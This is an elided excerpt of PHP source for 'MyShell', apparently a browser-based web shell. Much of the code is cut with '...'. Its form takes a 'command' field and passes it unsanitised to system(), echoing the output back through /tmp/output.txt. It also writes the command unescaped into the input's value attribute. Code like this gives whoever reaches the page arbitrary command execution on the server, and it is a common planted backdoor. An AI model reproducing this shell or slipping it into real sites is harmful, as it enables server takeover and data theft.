...
if ($selfSecure) {
 ...
 The MyShell dev team
       ";
            mail(
                $adminEmail,
                "MyShell Warning - Unauthorized Access",
                $warnMsg,
...
<br>
<textarea cols="<?php echo $oCols ?>" rows="<?php echo $oRows ?>" readonly>
<?php
echo $dirError;
if ($command) {
    if ($stderr) {
        ...
        if ($ok==false &&$status && $autoErrorTrap) {
            system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
        }
    }
}
...
<br>
Command:
<input type="text" name="command" size="80" <?php if ($command && $echoCommand) {
    echo "value=\"$command\"";
} ?> > <input name="submit_btn" type="submit" value="Go!">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<?php
if ($autoErrorTrap) {
    echo "Auto error traping enabled";
} else {
    echo "<input type=\"checkbox\" name=\"stderr\">stderr-traping ";
}
?>
